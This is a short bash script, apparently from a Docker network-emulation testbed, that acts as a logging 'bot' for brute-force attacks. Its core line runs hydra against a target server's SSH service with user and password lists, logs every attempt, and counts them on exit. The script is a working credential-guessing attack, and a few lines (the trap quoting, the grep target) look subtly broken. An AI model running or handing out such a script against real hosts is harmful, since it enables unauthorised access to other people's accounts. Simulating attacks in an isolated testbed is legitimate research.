#!/bin/bash



trap 'echo 'ATTEMPTS:' $( grep ATTEMPT ${name}.log |wc -l) |tee -a $log_file ; echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file; exit 0; ' SIGINT SIGTERM SIGKILL SIGQUIT

#rm *.restore 2>/dev/null

log_dir="/var/log/dockemu"
log_file=${1:-"$RANDOM"}

export name=$log_file
export log_file=${log_dir}/${log_file}.log

echo "LOGFILE:" $log_file

echo "[STARTING BOT-ID: $name $(date +%D-%T) ]" | tee -a $log_file

#sleep 1
#name.log
hydra -L /users -V -P /passwords -t 8 $server ssh | tee -a $log_file && \
echo 'ATTEMPTS:' $( grep ATTEMPT ${name}.log |wc -l) | tee -a $log_file && echo "[ENDING  $(date +%D-%T) ]" | tee -a $log_file